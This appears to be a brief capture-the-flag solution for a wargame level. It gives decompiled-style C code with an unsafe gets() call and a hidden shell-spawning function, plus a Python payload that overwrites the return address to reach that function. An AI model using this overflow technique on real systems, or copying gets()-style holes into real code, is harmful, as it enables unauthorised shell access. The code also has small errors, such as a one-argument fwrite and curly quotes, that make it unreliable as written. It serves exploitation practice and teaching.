int run()
{
    fwrite("Good... Wait what?\n");
    system("/bin/sh");
    return 0;
}

int main()
{
    char s;
    gets(&s);
    return 0;
}

python -c ‘print “a” * 76 + “\x44\x84\x04\x08"’
cat /tmp/test - | ./level1
